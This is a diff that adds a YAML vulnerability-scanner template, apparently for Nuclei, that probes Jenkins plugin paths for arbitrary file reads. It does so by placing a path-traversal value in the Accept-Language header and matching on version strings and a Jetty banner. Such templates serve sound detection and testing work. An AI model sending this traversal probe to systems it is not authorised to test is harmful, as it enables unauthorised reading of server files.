@@ -1,0 +1,31 @@
+id: poc-yaml-jenkins-arbitrary-file-read
+
+info:
+  name: Jenkins Plugin Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read, jenkins
+
+http:
+  - method: GET
+    path:
+      - "/plugin/credentials/.xml"
+      - "/plugin/git/.xml"
+      - "/plugin/ldap/.xml"
+    headers:
+      Accept-Language: /../../../config
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<version>"
+          - "</version>"
+          - "jenkins"
+      - type: word
+        part: header
+        words:
+          - "Jetty"
+      - type: status
+        status:
+          - 200
